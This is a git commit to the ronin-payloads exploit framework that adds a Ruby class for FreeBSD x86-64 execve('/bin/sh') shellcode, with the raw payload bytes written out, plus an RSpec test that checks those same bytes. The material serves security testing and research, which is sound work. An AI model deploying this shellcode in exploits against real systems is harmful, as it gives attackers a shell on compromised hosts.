126859c8df4d116010326193693710ca54e6cf9e
Postmodern <postmodern.mod3@gmail.com>
2022-12-09 19:58:37 -0800

    Added a FreeBSD x86-64 `execve()` shellcode payload (issue #42).

---
+++ lib/ronin/payloads/builtin/shellcode/freebsd/x86_64/execve.rb
@@ -0,0 +1,59 @@
+# frozen_string_literal: true
+#
+# ronin-payloads - A Ruby micro-framework for writing and running exploit
+# payloads.
+#
+# Copyright (c) 2007-2022 Hal Brodigan (postmodern.mod3 at gmail.com)
+#
+# ronin-payloads is free software: you can redistribute it and/or modify
+# it under the terms of the GNU Lesser General Public License as published
+# by the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# ronin-payloads is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU Lesser General Public License for more details.
+#
+# You should have received a copy of the GNU Lesser General Public License
+# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
+#
+
+require 'ronin/payloads/shellcode_payload'
+
+module Ronin
+  module Payloads
+    module Shellcode
+      module FreeBSD
+        module X86_64
+          class Execve < ShellcodePayload
+
+            register 'shellcode/freebsd/x86_64/execve'
+
+            arch :x86_64
+            os :freebsd
+
+            author 'Gitsnik'
+
+            summary 'FreeBSD x86-64 execve() shellcode'
+            description <<~DESC
+            FreeBSD x86-64 shellcode that calls execve() with "/bin/sh".
+            DESC
+
+            references [
+              "https://shell-storm.org/shellcode/files/shellcode-866.html"
+            ]
+
+            #
+            # Builds the shellcode.
+            #
+            def build
+              @payload = "\x48\x31\xc9\x48\xf7\xe1\x04\x3b\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05".b
+            end
+
+          end
+        end
+      end
+    end
+  end
+end
---
+++ spec/builtin/shellcode/freebsd/x86_64/execve_spec.rb
@@ -0,0 +1,42 @@
+require 'spec_helper'
+require 'ronin/payloads/builtin/shellcode/freebsd/x86_64/execve'
+
+describe Ronin::Payloads::Shellcode::FreeBSD::X86_64::Execve do
+  it "must inherit from Ronin::Payloads::ShellcodePayload" do
+    expect(described_class).to be < Ronin::Payloads::ShellcodePayload
+  end
+
+  describe ".id" do
+    subject { described_class }
+
+    it "must equal 'shellcode/freebsd/x86_64/execve'" do
+      expect(subject.id).to eq('shellcode/freebsd/x86_64/execve')
+    end
+  end
+
+  describe ".arch" do
+    subject { described_class }
+
+    it "must equal :x86_64" do
+      expect(subject.arch).to be(:x86_64)
+    end
+  end
+
+  describe ".os" do
+    subject { described_class }
+
+    it "must equal :freebsd" do
+      expect(subject.os).to be(:freebsd)
+    end
+  end
+
+  describe "#build" do
+    before { subject.build }
+
+    it "must set #payload" do
+      expect(subject.payload).to eq(
+        "\x48\x31\xc9\x48\xf7\xe1\x04\x3b\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05".b
+      )
+    end
+  end
+end
